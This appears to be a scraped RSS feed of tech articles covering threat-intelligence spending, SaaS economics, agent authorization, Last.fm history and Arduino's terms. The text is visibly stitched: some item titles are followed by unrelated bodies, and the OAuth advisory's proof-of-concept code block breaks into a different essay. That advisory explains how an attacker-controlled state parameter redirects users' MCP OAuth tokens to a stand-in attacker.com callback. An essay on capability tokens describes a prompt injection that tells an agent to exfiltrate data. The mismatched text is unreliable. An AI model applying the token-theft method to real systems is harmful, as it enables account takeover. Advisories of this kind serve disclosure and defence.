Intelligence platforms will automatically enrich new indicators, correlate them with ongoing events, and even trigger protective actions in real time—all with analysts overseeing the entire process.Ultimately, a mature program in 2026 will be measured by the outcomes it enables and the risk it reduces for the organization. This means protecting the assets, uptime, and reputation the business cares about, and improving decision quality at all levels of management.Implications for 2026 Security Budgets and InvestmentsAs threat intelligence becomes more central to security strategy, it’s also becoming a bigger line item in budgets. In fact, 91% of organizations plan to increase their threat intelligence spending in 2026, reflecting its critical role in an era of escalating cyber threats.One likely area for these increased funds is platform consolidation. Many teams are reevaluating their myriad point solutions and considering a move to more integrated platforms that unify multiple sources and use cases, reducing complexity and cost over time.Another likely investment will be in automation and AI capabilities. With cyber talent scarce and alert volumes ever-increasing, it will be vital to budget for tools that automate threat intelligence workflows end-to-end. From data collection and enrichment to triage and even initial response, automation will be key to doing more with the same team.After integrating Recorded Future into our Cyber Threat Intelligence (CTI) workflow…. We reduced detection time by 40%, from an average of 48 hours to 28 hours. Incident response efficiency improved by 30%, as automated enrichment from Recorded Future replaced manual intelligence gathering. We also identified and mitigated 25% more threats compared to the previous quarter.Cyber Threat Intelligence Specialist, Large Enterprise Professional Services CompanyOrganizations should also ensure that new investments deliver contextual intelligence tailored to their business. It’s not enough to simply buy more feeds or tools that spit out data; the value lies in solutions that fuse internal data with external threat feeds and apply analytics to highlight what matters most.That said, not every organization will have the same needs and challenges. The key to fully maximizing ROI will be aligning spending with the organization’s biggest gaps and pain points. If credibility of data is a major challenge, invest in sources with proven reliability or validation features. If integration is a key issue, focus spending on consolidation projects or appropriate vendor services.Security teams should also establish clear metrics (such as reduced incident response time or incidents prevented) to measure the impact of threat intelligence investments. For example, over half (54%) of organizations now measure success by improved detection and response times, making it a top metric for demonstrating value delivered by threat intelligence initiatives.Charting the Course to 2026Enterprise threat intelligence is undoubtedly maturing and becoming more ingrained in security programs, yet much work still remains. Nearly half of organizations may call themselves “advanced” today, but truly predictive, integrated intelligence at scale is still a goalpost ahead. In looking toward 2026, security leaders should double down on the fundamentals that drive intelligence maturity: integration, automation, and alignment with business priorities.By breaking down silos between tools and teams, trusting and acting on intelligence through improved data credibility and context, and continually measuring what works, teams can evolve from reactive defense to an anticipatory, intelligence-driven security posture.So what are some practical next steps? First, it’s wise to benchmark your organization’s current program to identify gaps and opportunities. Tools like Recorded Future’s Threat Intelligence Maturity Assessment provide a structured way to evaluate where you stand today and get tailored recommendations on how to improve.With that insight, you can develop a roadmap that includes the right people, process, and technology investments to operationalize threat intelligence in the most efficient way. Keep the big picture in mind: the ultimate aim is to see more threats, identify them faster, and take action to reduce risk before damage is done. With a thoughtful strategy and an eye towards these trends, organizations can chart a course from today’s challenges to a more proactive and resilient threat intelligence function in 2026 and beyond.]]></content:encoded></item><item><title>Token Leak via Open Redirection and CSRF in the Callback Handler of cloudflare/workers-oauth-provider</title><link>https://github.com/google/security-research/security/advisories/GHSA-2h78-5wx8-jccc</link><author>sleightofalex</author><category>vulns</category><pubDate>Sun, 14 Dec 2025 23:59:24 +0000</pubDate><source url="https://0dayfans.com/feed.rss">0dayFans</source><content:encoded><![CDATA[**security-research** Public

# Token Leak via Open Redirection and CSRF in the Callback Handler of cloudflare/workers-oauth-provider

## Package

## Affected versions

## Patched versions

## Description

### Summary

Clients are required in the OAuth spec to prevent CSRF attacks at its Callback handler. The implementation in cloudflare/workers-oauth-provider doesn’t protect against CSRF and, in addition, it uses the plaintext redirect\_uri parameter in the base64 encoded state parameter to redirect the auth code or token. This means that an attacker crafted URL with a custom state parameter can openly redirect the user’s MCP OAuth token to arbitrary endpoints even though the user thinks they are interacting with a known MCP server.

### Background

Normally, authentication with Cloudflare MCP servers using cloudflare/workers-oauth-provider involves two separate OAuth flows, one between the MCP Client and the Cloudflare MCP Server and another between the MCP Server (acting as an OAuth client) and the Cloudflare Authorization server. This matches the Third-Party Authorization Flow found in early versions of the MCP Specification that has since been removed.

However, the attacker can short circuit the normal flow by creating their own Authorization URL, replacing the redirection URL that would normally go to the Valid MCP client with their own server’s URL. This results in the user going through an OAuth flow with Cloudflare’s Authorization server and MCP Server as if it was a valid client, but instead redirecting the user’s token to the attacker’s server.

At the time of reporting this issue, there was also no consent page for dynamically registered OAuth clients at Cloudflare’s MCP servers which would also allow token theft by the attacker dynamically registering their own OAuth client. This separate issue is in the MCP Server implementation itself and was already known by Cloudflare and has since also been fixed.

### Severity

Medium - The user must visit a link and consent to giving Cloudflare’s MCP server access to their account (see screenshot in Proof of Concept section), however there is no consent mentioning or granting access to the attacker controlled endpoint. This results in the user thinking they are interacting only with valid Cloudflare owned services, while their token is actually being sent to the attacker.

### Proof of Concept

The cloudflare/workers-oauth-provider callback handler implementation trusts the incoming state parameter without performing any CSRF prevention. The state parameter is a base64 encoded, but otherwise unprotected, JSON message that contains the redirectUri the user’s auth code or token is redirected to. This redirectUri is not checked against the OAuth client configuration.

As an example, the decoded state parameter from a valid OAuth flow looks like:

## **As the Attacker**

Create a hosted endpoint that can capture the callback from the server using cloudflare/workers-oauth-provider. We use https://bindings.mcp.cloudflare.com/ as an example that uses cloudflare/workers-oauth-provider, but all the Cloudflare MCP servers appear to use the package. We will say this callback is hosted at https://attacker.com/callback in the example below.

```

Entire industries got swallowed by software - retail, media, finance - you name it, there has been incredible disruption over the past couple of decades with a proliferation of SaaS tooling. This has led to a huge swath of SaaS companies - valued, collectively, in the trillions.In my last post debating if the cost of software has dropped 90% with AI coding agents I mainly looked at the  side of the market. What will happen to  for SaaS tooling if this hypothesis plays out? I've been thinking a lot about these second and third order effects of the changes in software engineering.The calculus on build vs buy is starting to change. Software ate the world. Agents are going to eat SaaS.The obvious place to start is simply demand starting to evaporate - especially for "simpler" SaaS tools. I'm sure many software engineers have started to realise this - many things I'd think to find a freemium or paid service for I can get an agent to often solve in a few minutes, exactly the way I want it. The interesting thing is I didn't even notice the shift. It just happened.If I want an internal dashboard, I don't even think that Retool or similar would make it easier. I just build the dashboard. If I need to re-encode videos as part of a media ingest process, I just get Claude Code to write a robust wrapper round ffmpeg - and not incur all the cost (and speed) of sending the raw files to a separate service, hitting tier limits or trying to fit another API's mental model in my head.This is even more pronounced for less pure software development tasks. For example, I've had Gemini 3 produce really high quality UI/UX mockups and wireframes in minutes - not needing to use a separate service or find some templates to start with. Equally, when I want to do a presentation, I don't need to use a platform to make my slides look nice - I just get Claude Code to export my markdown into a nicely designed PDF.The other, potentially more impactful, shift I'm starting to see is people really questioning renewal quotes from larger "enterprise" SaaS companies. While this is very early, I believe this is a really important emerging behaviour. I've seen a few examples now where SaaS vendor X sends through their usual annual double-digit % increase in price, and now teams are starting to ask "do we actually need to pay this, or could we just build what we need ourselves?". A year ago that would be a hypothetical question at best with a quick 'no' conclusion. Now it's a real option people are putting real effort into thinking through.Finally, most SaaS products contain many features that many customers don't need or use. A lot of the complexity in SaaS product engineering is managing that - which evaporates overnight when you have only one customer (your organisation). And equally, this customer has complete control of the roadmap when it is the same person. No more hoping that the SaaS vendor prioritises your requests over other customers.The maintenance objectionThe key objection to this is "who maintains these apps?". Which is a genuine, correct objection to have. Software has bugs to fix, scale problems to solve, security issues to patch and that isn't changing.I think firstly it's important to point out that a  of SaaS is poorly maintained (and in my experience, often the more expensive it is, the poorer the quality). Often, the security risk comes from having an external third party  needing to connect and interface with internal data. If you can just move this all behind your existing VPN or access solution, you suddenly reduce your organisation's attack surface dramatically.On top of this, agents  lower maintenance cost dramatically. Some of the most painful maintenance tasks I've had - updating from deprecated libraries to another one with more support - are made significantly easier with agents, especially in statically typed programming ecosystems. Additionally, the biggest hesitancy with companies building internal tools is having one person know everything about it - and if they leave, all the internal knowledge goes. Agents don't leave. And with a well thought through AGENTS.md file, they can explain the codebase to anyone in the future.Finally, SaaS comes with maintenance problems too. A recent flashpoint I've seen this month from a friend is a SaaS company deciding to deprecate their existing API endpoints and move to another set of APIs, which don't have all the same methods available. As this is an essential system, this is a huge issue and requires an enormous amount of resource to update, test and rollout the affected integrations.I'm not suggesting that SMEs with no real software knowledge are going to suddenly replace their entire SaaS suite. What I do think is starting to happen is that organisations with some level of tech capability and understanding are going to think even more critically at their SaaS procurement and vendor lifecycle.The economics problem for SaaSSaaS valuations are built on two key assumptions: fast customer growth and high NRR (often exceeding 100%).I think we can start to see a world already where demand from new customers for certain segments of tooling and apps begins to decline. That's a problem, and will cause an increase in the sales and marketing expenditure of these companies.However, the more insidious one is net revenue retention (NRR) declines. NRR is a measure of how much existing customers spend with you on an ongoing basis, adjusted for churn. If your NRR is at 100%, your existing cohort of customers are spending the same. If it's less than that then they are spending less with you  customers are leaving overall.Many great SaaS companies have NRR significantly above 100%. This is the beauty of a lot of SaaS business models - companies grow and require more users added to their plan. Or they need to upgrade from a lower priced tier to a higher one to gain additional features. These increases are generally  profitable. You don't need to spend a fortune on sales and marketing to get this uptick (you already have a relationship with them) and the profit margin of adding another 100 user licenses to a SaaS product for a customer is somewhere close to infinity.This is where I think some SaaS companies will get badly hit. People will start migrating parts of the solution away to self-built/modified internal platforms to avoid having to pay significantly more for the next pricing tier up. Or they'll ingest the data from your platform via your APIs and build internal dashboards and reporting which means they can remove 80% of their user licenses.Where this doesn't work (and what still has a moat)The obvious one is anything that requires very high uptime and SLAs. Getting to four or five 9s is really hard, and building high availability systems gets really difficult - and it's very easy to shoot yourself in the foot building them. As such, things like payment processing and other core infrastructure are pretty safe in my eyes. You're not (yet) going to replace Stripe and all their engineering work on core payments easily with an agent.Equally, very high volume systems and data lakes are difficult to replace. It's not trivial to spin up clusters for huge datasets or transaction volumes. This again requires specialised knowledge that is likely to be in short supply at your organisation, if it exists at all.The other one is software with significant network effects - where you collaborate with people, especially external to your organisation. Slack is a great example - it's not something you are going to replace with an in-house tool. Equally, products with rich integration ecosystems and plugin marketplaces have a real advantage here.And companies that have proprietary datasets are still very valuable. Financial data, sales intelligence and the like stay valuable. If anything, I think these companies have a real edge as agents can leverage this data in new ways - they get more locked in.And finally, regulation and compliance is still very important. Many industries require regulatory compliance - this isn't going to change overnight.This does require your organisation having the skills (internally or externally) to manage these newly created apps. I think products and people involved in SRE and DevOps are going to have a real upswing in demand. I suspect we'll see entirely new functions and teams in companies solely dedicated to managing these new applications. This does of course have a cost, but this cost can be often managed by existing SRE or DevOps functions, or if it requires new headcount and infrastructure, amortised over a much higher number of apps.To me the companies that are at serious risk are back-office tools that are really just CRUD logic - or simple dashboards and analytics on top of their customers' .These tools often generate a lot of friction - because they don't work  the way the customer wants them to - and they are tools that are the most easily replaced with agents. It's very easy to document the existing system and tell the agent to build something, but with the pain points removed.SaaS certainly isn't dead. Like any major shifts in technology, there are winners and losers. I do think the bar is going to be much higher for many SaaS products that don't have a clear moat or proprietary knowledge.What's going to be difficult to predict is how quickly agents can move up the value chain. I'm assuming that agents can't manage complex database clusters - but I'm not sure that's going to be the case for much longer.And I'm not seeing a path for every company to suddenly replace all their SaaS spend. If anything, I think we'll see (another) splintering in the market. Companies with strong internal technical ability vs those that don't. This becomes yet another competitive advantage for those that do - and those that don't will likely see dramatically increased costs as SaaS providers try and recoup some of the lost sales from the first group to the second who are less able to switch away.But my key takeaway would be that if your product is just a SQL wrapper on a billing system, you now have thousands of competitors: engineers at your customers with a spare Friday afternoon with an agent.]]></content:encoded></item><item><title>Claude CLI deleted my home directory and wiped my Mac</title><link>https://old.reddit.com/r/ClaudeAI/comments/1pgxckk/claude_cli_deleted_my_entire_home_directory_wiped/</link><author>tamnd</author><category>dev</category><pubDate>Sun, 14 Dec 2025 23:23:00 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>CVE-2025-67900 - NXLog Agent OpenSSL Configuration File Load Vulnerability</title><link>https://cvefeed.io/vuln/detail/CVE-2025-67900</link><author></author><category>vulns</category><pubDate>Sun, 14 Dec 2025 23:15:37 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-67900

I ended with an uncomfortable conclusion: it might not be possible at all.In my last post, I showed that static permissions can’t track dynamic intent. We decompose tasks across agents, but authority stays consolidated. The gap is real.Today I’ll make some enemies.  Here’s my claim:Delegation cannot be secured by refining identity because delegation is not an attribute of who you are. It is an operation on authority itself. Authority must be constructed, passed, and monotonically reduced as data. Capability systems are the only authorization model that treats delegation as a first-class, enforceable transformation rather than an inferred side effect.When you hand your car to a valet, you have two options. Check his badge. Hand him your master key. Trust him not to open the trunk or take a detour. Trust becomes part of the security model. Hand him a valet key. It starts the engine, limits speed, disables the trunk. You don’t need to trust he follows your instructions. The key  the policy.Most systems use Option A. They verify the badge, hand over the master key, and hope for the best.Hope, unfortunately, is not a security primitive.The problem isn’t verification. The problem is there’s no valet key. Only master keys get handed over, and they remain valid across tasks whose intent was never considered.Why Context-Aware IAM Cannot Enforce DelegationA natural objection: “Modern IAM is more sophisticated than a badge check. Use session tags. Add conditions.”This misunderstands the problem delegation creates.Problem 1: Conditions Check Attributes, Not DerivationIAM conditions are powerful. They gate permissions on identity, resource tags, time, location, device posture. When a Scraper requests access, the policy can ask: Is this the right identity? Is this resource tagged for this use? Is this request during business hours?All of that works. None of it captures delegation.When a Researcher delegates to a Scraper, what should the policy verify?That this specific authority came from a specific delegationThat the Scraper’s scope is bounded by what the Researcher hadThat the delegation chain is intact and attenuated at each hopThese aren’t attributes. They’re relationships. IAM has no field for “derived from” and no operator for “is subset of parent’s authority.”You can tag the Scraper’s request with . But the tag is a claim, not a proof. The policy cannot verify that the Researcher actually had the authority being exercised, or that the Scraper hasn’t exceeded it.IAM asks: Does this identity, in this context, have this permission?Delegation asks: Was this authority handed down, and did it shrink?Different questions. IAM answers the first. It has no vocabulary for the second.IAM evaluates requests against ambient identity. Delegation requires evaluating requests against derived authority. These are not the same operation, and no amount of context makes them equivalent.Problem 2: Identity and Intent Live on Different TimelinesIAM binds permissions against identities.Agents make decisions against tasks.Those timelines do not align.Agents do not know all required actions upfront. They reason, adapt, and decide mid-execution. A Researcher might read a config file, then decide to “quickly check” a customer database.IAM cannot revoke authority mid-task because the identity has not changed. The permissions remain ambient.Any system where authority is granted before intent is known cannot revoke authority when intent changes without reintroducing a control plane into the execution path.Safe delegation requires authority to appear and disappear with the task itself.Problem 3: The Confused DeputyIn 1988, Norm Hardy described the Confused Deputy problem: a program with legitimate authority being tricked into misusing it because it cannot distinguish  it has that authority.
IAM makes every long-running agent a confused deputy by design. The Scraper has authority because it is a Scraper, not because the Researcher delegated specific permissions for this task. When a prompt injection tells the Scraper to exfiltrate data, the Scraper has no way to know this was not intended.The authority is ambient. The intent is invisible. The deputy is confused because the system never records why authority was granted, only to whom.Every failure traces back to the same root.IAM asks , then infers what you can do. Delegation isn’t about who you are. It’s about what you were handed, by whom, for what purpose. Identity cannot answer those questions because identity was never designed to.Zero Trust doesn’t change this. It verifies identity at every hop rigorously and continuously. But it’s still identity. It still asks , not .It’s the wrong abstraction for the job.Tyler Close proved this formally in “ACLs Don’t” (2009): ACLs cannot make correct access decisions for interactions involving more than two principals, because required information isn’t retained across message sends.Delegation is exactly that: a chain of principals, each constraining the next. ACLs forget the chain at every hop.Context can describe intent. Authority must be derived.If authority isn’t explicitly passed, it will be implicitly assumed. That assumption is where most security bugs live.
Systems that infer authority from identity cannot distinguish between authority granted for this task and authority granted for any task.Identity is constant. Intent changes. Authority should track intent.Once delegation must be enforced mechanically rather than socially or declaratively, any model that reloads authority from identity at each hop is structurally invalid. Only subtractive derivation survives.Anatomy of a Capability TokenEvery field exists to preserve authority provenance across hops.: Not “this agent can read files” but “this agent can read CSVs under .” The constraints are in the token, not in a policy server.: Binds the token to a public key. Possession alone isn’t enough.: Minutes, not hours. Task ends, authority ends.: Each delegation hop signed. The history embedded. Self-contained. No policy lookup required.The Invariant: Authority Only ShrinksA derived capability cannot exceed its parent.Reintroducing write_file would require forging cryptographic signatures. Widening the path would violate the constraint lattice.Attenuation isn’t policy. It is a consequence of cryptographic derivation.This is what Mark Miller called the principle of least authority made mechanical: you can only give what you have, and you can only give less.Why This Solves Confused DeputyWith capabilities, there’s no ambient authority. The Scraper doesn’t have permissions “because it’s a Scraper.” It only has what was explicitly handed to it for this request.
When a prompt injection tells the Scraper to exfiltrate data, the Scraper checks its capability token. The capability permits  on . It does not permit  or network egress. The request fails. The injection succeeds at the LLM layer. It fails at the authorization layer.
The deputy isn’t confused because there is no hidden source of authority to be confused about. The only authority that exists is the authority that was delegated.Same attack. Different authorization model. Different outcome.Bearer tokens fail because possession equals authority. Leak the token, attacker is authorized.Capabilities bind authority to a holder key. Using one requires proving you hold the corresponding private key.A stolen token is useless without the key.
A replayed request expires in seconds.Authority is explicit. Possession is proven.Agents operate at millisecond timescales. They cannot wait for policy server round-trips.Capabilities are self-contained: the token has scope, constraints, expiry, signatures, holder binding. Verification is local. No central engine. No runtime dependency.Google’s Macaroons (2014) demonstrated that decentralized authority attenuation works at scale. Biscuit added public-key signatures and proved that attenuated, verifiable authorization is possible.Agents require something stricter: task-local authority that is created, transformed, and destroyed inside the control flow of reasoning itself.
That requirement invalidates identity-based reload and central evaluation entirely.
These systems prove that attenuation and offline verification are possible. They do not address delegation that emerges dynamically from agent reasoning itself.Part 3. Why Agents Need ThisOnce delegation becomes dynamic, these properties stop being nice-to-have. They become mandatory.. Task-scoped authority. When the task ends, authority vanishes. No cleanup, no revocation.. Each hop narrows. Workers can’t re-delegate broader authority than received.. Stolen token is useless without the private key. Possession must be proven.. Millisecond timescales. No policy server. Everything travels with the request.. The LLM can be fooled. The capability cannot. Attack succeeds at language layer, fails at authorization layer.. The token is cryptographic proof of who authorized what. No logs to correlate.I’ve spent the last few months of weekends building an open-source engine that makes this operational. Releasing soon.

But the first inklings of it were emerging a couple of years before. As usual, music was the harbinger.Last.fm was founded in 2002 by a group of four Austrian and German students from Ravensbourne College of Design and Communication in London. It was fashioned as an internet radio station that allowed a user to build a listening profile and share it with others. The year of its launch, Last.fm won a young talent award at the Europrix, a multimedia awards show based in Vienna. This was how the product was described in a showcase video (embedded below) leading up to the awards ceremony:“After repeated use, the system builds a listening profile that increasingly reflects the user's preferences. The sum of all profiles is visualized in the ‘Map of Music,’ a presentation of musical connections and genres determined only by the collaborative effort of Last.fm users.”When the students went up to receive their award, one of them, Thomas Willomitzer, noted the importance of “collaborative filtering” to the Last.fm system. The idea was that the Last.fm algorithm would recommend music you might like, based on your listening history combined with the listening history of other, similar, users. Willomitzer added that this type of algorithm would be familiar to people who used Amazon.com.Collaborative filtering was a common technique in recommender systems, and its history dated back to before the web — for instance, it was the basis for a 1992 Xerox PARC email system called ‘Tapestry.’ But collaborative filtering really came into its own during the web era, and in particular it was popularised by Amazon. By 2002, Amazon users were familiar with the following message: “Customers who bought items in your Shopping Cart also bought…” There was also a “Your Recommendations” list on the Amazon.com homepage. Both of these features were created using an algorithm that Amazon called “item-to-item collaborative filtering.” As explained in a research paper:“Rather than matching the user to similar customers, item-to-item collaborative filtering matches each of the user’s purchased and rated items to similar items, then combines those similar items into a recommendation list.”The key here is that Amazon’s collaborative filtering was done based on the items people bought or rated, not the profiles of its users. This approach was also crucial to how new social web services like Last.fm would develop. The “map of music” that Last.fm created was all about mapping which songs (or genres) were interconnected — so a certain Bob Dylan song might have a strong connection to a certain Joni Mitchell song, based on listener data, and thus the Mitchell song might come up as a recommendation for people who listened to the Dylan song (and vice versa).By coincidence, another student in the UK was also working on a recommendation system for music in 2002. Audioscrobbler was started as a computer science project by Richard Jones at the University of Southampton. Jones coined the term “audioscrobbling" (later shortened to “scrobbling”) to describe the process of tracking songs that you listen to in order to make a listening profile, which is then used for recommendations.“Users of the system need to download software on to their computer that monitors what artists they listen to. The data is then collated and a pattern emerges by way of a technique known as ‘collaborative filtering.’ The results are then recorded against a username and can be compared with the listening tastes of other members.”Later, Jones would team up with the Ravensbourne College students and fold his project into Last.fm, but even in 2002 — when they were independent products — it is striking how similar the two systems were. Both used collaborative filtering to create song recommendations, and both aimed to create a kind of social network based around what users listened to.Escaping the Broadcast ModelThe key to the emerging social web would be that you discover new content and communities by . For music, the idea was to help you break away from the established broadcast model. At the Europrix event, Last.fm’s Martin Stiksel brought out a 1980s-style transistor radio to illustrate the point. If you want to listen to music on such a device, Stiksel explained, you have to tune the frequency band to find your station. If you don’t like the music playing on that station, you tune the dial to another radio station and try your luck again.“The inherent problem with broadcast media is that basically, at the end of the day, it's always somebody else selecting the music for you,” said Stiksel. “So there's always a bunch of editors or programmers that picked the music and put them into into a program for you.”With Last.fm, the stream of music you heard was a mix of manual choice and algorithmic selection. You might start with a song already in your online “record collection” (the term Stiksel kept using), or start from another user’s profile. From then on, songs would be chosen for you based on collaborative filtering. If you played a song through, the Last.fm software automatically added it to your own collection. You could also press a “love” button to add it. But if you didn’t like a certain track, you could press a “hate” button (so it wouldn’t get played again), or click the “skip” button to move to the next song. There was also a “change” button to go to a different user profile.The early Last.fm user interface was, in truth, a bit cluttered with all these different buttons and various search boxes — but over time it would get more streamlined.Stiksel explained that the idea for Last.fm came about when the students asked themselves, “how do you look for something that you don't know?” So in the case of music, how to discover new music when you don’t necessarily know what type of music you’re looking for? The answer, he said, was the social component.“Then we figured out that it's the social aspect of music — the best music you always find when you go to your friend's house and he plays you records. And we’re taking this concept into an online environment here.”What both Last.fm and Audioscrobbler stumbled onto in 2002 was the collective value of user data in discovering new content — something that Amazon was also taking advantage of at this time. The problem with music, though, was that licensing from record companies was still highly restrictive. The Last.fm founders somewhat glossed over it during their Europrix presentation, but they did admit that “due to legal issues, we're only allowed to play 30 second samples.” Unless you already owned a piece of music, 30 seconds was all you got.By the following year, however, Last.fm had begun turning itself into an "online radio" service, by paying licensing fees to the UK collecting societies PRS (Performing Right Society) and MCPS (Mechanical-Copyright Protection Society).So pre-Web 2.0, the streaming revolution was only just getting started. But with Last.fm and Audioscrobbler, we at least glimpsed the future of the social web.My Web 2.0 memoir, Bubble Blog: From Outsider to Insider in Silicon Valley's Web 2.0 Revolution, is now available to purchase:Or search for "Bubble Blog MacManus" on your local online bookstore.]]></content:encoded></item><item><title>JSDoc is TypeScript</title><link>https://culi.bearblog.dev/jsdoc-is-typescript/</link><author>culi</author><category>dev</category><pubDate>Sun, 14 Dec 2025 19:42:53 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Adafruit: Arduino’s Rules Are ‘Incompatible With Open Source’</title><link>https://thenewstack.io/adafruit-arduinos-rules-are-incompatible-with-open-source/</link><author>MilnerRoute</author><category>dev</category><pubDate>Sun, 14 Dec 2025 18:18:34 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[The open source hardware community is debating Arduino’s new Terms and Conditions following the company’s acquisition by Qualcomm.Arduino microcontroller boardChief microcontroller rival Adafruit has argued that the new terms threaten open principles by restricting reverse engineering of cloud tools, asserting perpetual licenses over user uploads and implementing broad monitoring for AI-related features.Arduino has defended the changes, claiming restrictions only apply to its SaaS cloud applications, that data handling is standard for modern platforms, and its commitment to open source hardware remains unchanged.The Debate Over Arduino’s New Terms and ConditionsMany criticisms came from rival Adafruit, whose products include Arduino-compatible hardware kits. In late November, Adafruit’s Managing Editor Phillip Torrone had warned its 36,000+ followers on LinkedIn that (among other things) Arduino’s users were now “explicitly forbidden from reverse engineering or even attempting to understand how the platform works unless Arduino gives permission.”But Arduino responded in a blog post that “Restrictions on reverse engineering apply specifically to our Software-as-a-Service cloud applications. Anything that was open, stays open.”An Arduino spokesperson said their blog post reassured many readers, who’d said they felt “understanding and relief that our commitment to the open source spirit is unwavering and Arduino’s core mission remains unchanged.” Yet Adafruit’s critical LinkedIn post had drawn over 1,575 upvotes. I asked both sides to clarify their positions. Does this really represent a turning point since Arduino’s founding in 2004?Here’s what they had to say.Reverse Engineering: Cloud Apps vs. Hardware BoardsI asked Mitch Stoltz, EFF director for competition and IP litigation, who agreed that Arduino “isn’t imposing any new bans on tinkering with or reverse engineering Arduino boards.”Like Adafruit, Arduino’s primary user base is at-home enthusiasts. Arduino provides an open source electronics platform — which includes single-board microcontrollers such as the Arduino UNO — and various kits/shields/accessories, as well as development software.Nonetheless, Adafruit founder Limor “Ladyada” Fried says Arduino’s response “downplays how central the cloud and web tools have become to the Arduino experience.”“If you go to the Arduino software page and the cloud page, you’re strongly encouraged to use the cloud editor/web IDE and cloud plans, especially on platforms like ChromeOS where the cloud editor is the recommended or only realistic path,” Fried said. “So when Arduino says ‘These restrictions only apply to SaaS,’ that still means the restrictions apply to the tools many new users are being steered into as their primary Arduino environment.“On top of that, using those cloud tools generally requires an Arduino account, and the signup flow prominently presents marketing and profiling consents, including consent to processing personal data for commercial offers and to profiling for customized offers.“That is a very different model than ‘download a local IDE and just start hacking on hardware,'” Fried said.“Even if the underlying firmware and libraries remain open source, the practical entry point for many users is moving”, she pointed out, in that accounts are tied to personal data, marketing and profiling prompts have been introduced, and are being linked to centralized, subscription-oriented cloud services.Understanding the License on User-Uploaded ContentAdafruit’s Torrone had also said Arduino’s new documents “introduce an irrevocable, perpetual license over anything users upload.”But Arduino argues they’re instead clarifying that “content you choose to publish on the Arduino platform remains yours, and can be used to enable features you’ve requested, such as cloud services and collaboration tools.”In a follow-up interview, an Arduino spokesperson provided clarifying examples:“If a user uploads their code sketches on their Arduino Cloud subscription, the content remains their own, private to them, and the licensing rights granted to Arduino are strictly functional to perform the requested features (e.g. compiling the sketch in the cloud).”“If the user uploads code or content to Project Hub or to the Forum, where the content is visible to all other users, then Arduino requires the user, who retains the ownership of the content, to grant a license to handle the publication.”“[W]ithout this license, we could not run user projects on the cloud or display their posts in the forum, which is why this type of license is typically required to run any modern cloud service or social platform.”Arduino’s old terms of use had also required a license for using material posted, notes EFF’s Stoltz, which he says is “normal for any online platform.”But then Stoltz adds that “Still, some of the changes to the terms are troubling.”Arduino’s old terms “were unusual in giving users the ability to revoke that license at any time. The new terms remove that ability, making the license irrevocable. It’s disappointing to see a platform that was once especially user-protective revert to the norm.”User Data and the Right To Delete AccountsArduino also pointed out an additional privacy protection. “All users retain the right to request deletion of their account and/or content at any time. Upon such deletion, the relevant content will no longer be visible to other users.”Torrone had complained of “years-long retention of usernames even after account deletion,” but Arduino calls that “a misunderstanding of our policy … When a user requests account deletion, we immediately delete the account and remove the user’s username from all associated Forum posts.“The five-year public retention of usernames applies only to users who simply have not logged into their Arduino user account for 24 months  have not submitted any data or account deletion requests.” (In those cases, Arduino seeks a status where “contributions remain attributed to inactive usernames, honoring their contribution to the community.”)So, for those inactive-for-two-years users, accounts are automatically deactivated, Arduino’s blog post clarified, but with usernames preserved in the Arduino Forum “to address an explicit request from the Forum community to maintain attribution for user-generated content.” (And where a user does request account deletion, “the username would be promptly removed and related posts would become anonymous.”)Even then, with those inactive accounts, “After five years the username is deleted,” Arduino’s spokesperson explained, “and relevant user posts or comments are de-identified.“This policy is not meant for data retention for commercial use, but instead solely to help preserve content attribution, something the community has emphasized as valuable.”But Adafruit’s Fried still says there’s a troubling pattern in how usernames are retained and not deleted. “Policy choices that treat the community’s identity and data as a managed asset, rather than something users can fully control.”AI Features and User Monitoring Policies on ArduinoThe culture difference is most clear where the new Terms and Conditions list several “prohibited uses of AI,” which include criminal use and violation of the law, intentions to harm (including dissemination of false information and manipulative or deceptive acts), generating facial recognition databases and military use.Arduino’s blog post notes its new AI features are optional — including AI-powered computer vision and audio models and an IDE with pre-trained AI models. But in the new Terms and Conditions, Arduino “reserves the right to monitor User accounts and use of the AI Product … [for] verifying compliance with laws and this policy.”Arduino says the monitoring is “to comply with existing laws and regulations, including applicable privacy laws, export controls, and other global regulatory requirements” and “verify compliance with legal and policy standards.” And they add their ultimate goal is “protecting the users and Arduino” and to enable “robust and reliable operation of the AI products.”But their conditions also include the right to monitor for other reasons, including “administering and managing Arduino’s business.”Adafruit’s Fried says Arduino “should, of course, comply with applicable laws and respond appropriately to clear evidence of criminal activity.” But “they should design their AI and cloud offerings so that monitoring is narrowly targeted, proportionate, and clearly explained, instead of defaulting to broad surveillance across all users.”“You cannot say ‘this code is open source, but it may not be used for military purposes’ and still call the license open source.”— Adafruit Founder Limor FriedFried instead sees “an ongoing surveillance posture, not just responding to specific, well-founded reports of abuse.”So yes, an open source application can watch for the creation of facial-recognition databases or military use “as long as they are transparent about what they log, how long they keep it, and under what circumstances they review it.” But there are concerns about “broad continuous monitoring erodes user trust, especially in an educational/maker context where many people are minors or hobbyists who expect a relatively private environment.”And there’s an even larger issue of principle. “Genuine open source licenses do not allow field-of-use restrictions,” Fried said. “You cannot say ‘this code is open source, but it may not be used for military purposes’ and still call the license open source.Once you present something as open source, you no longer get to pick and choose ‘good’ versus ‘bad’ users.” Fried calls such restrictions “fundamentally incompatible with open source licensing,” and would like to see Arduino remove them. “If a project wants that kind of control, it should be honest and call itself ‘source-available’ or something similar, not open source.”Torrone noted that Arduino’s Terms and Conditions also state users will undertake not to use Arduino’s platform or services “to identify or provide evidence to support any potential patent infringement claim against Arduino … or any of Arduino’s or Arduino’s Affiliates’ suppliers and/or direct or indirect customers.” But the specifics almost seem beside the point. Fried says Arduino’s usage restrictions “effectively override the freedoms the license is supposed to guarantee.”What’s Next for Arduino and the Open Source Community?“Transparency and open dialogue are fundamental to the Arduino ethos,” its spokesperson said Friday, “and understanding the community’s concerns, we are eager to set the record straight and reaffirm our commitment to the open source community.”The representative also added that “We are committed to continuing to listen to community feedback.”So what will Adafruit do next? Fried said Friday that Adafruit isn’t changing, and would “keep designing and shipping open source hardware, with hardware, firmware, and software available so people can learn from it, modify it, and build on it.” And the company supports “multiple” ecosystems, also continuing work on Wi-Fi/Bluetooth low-energy (BLE) chips, matter-based Internet of Things (IoT), and the Linux Foundation’s real-time OS Zephyr.“We are 